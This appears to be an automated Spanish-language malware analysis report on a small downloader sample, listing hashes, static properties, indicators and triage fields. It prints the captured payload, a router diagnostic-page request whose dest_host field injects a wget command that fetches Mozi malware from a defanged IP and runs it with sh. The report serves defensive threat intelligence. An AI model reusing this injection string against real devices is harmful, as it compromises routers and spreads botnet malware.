# 🧬 Payload Analysis

`acb1bd8bcd0003d47060f0783a436b1ca0f289ae62066d8bfaf86af999979c13`

## 📌 Resumen

Texto ASCII de 319 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://61.216.49.XXX:47103/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://61.216.49.XXX:47103/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/acb1bd8bcd0003d47060f0783a436b1ca0f289ae62066d8bfaf86af999979c13.md](../../../../../malware-like/oraculo/downloader/acb1bd8bcd0003d47060f0783a436b1ca0f289ae62066d8bfaf86af999979c13.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:10:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `acb1bd8bcd0003d47060f0783a436b1ca0f289ae62066d8bfaf86af999979c13`
- **SHA1:** `976b77bf79e4de5ef6d96e12218b33c761812107`
- **MD5:** `47c261ca327237969d1cd57deb3af23f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.43 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.216.49.XXX:47103/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://61.216.49.XXX:47103/Mozi.m+-O+- | strings |
| ip | 61.216.49.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.216.49.XXX:47103/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | acb1bd8bcd0003d47060f0783a436b1ca0f289ae62066d8bfaf86af999979c13 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
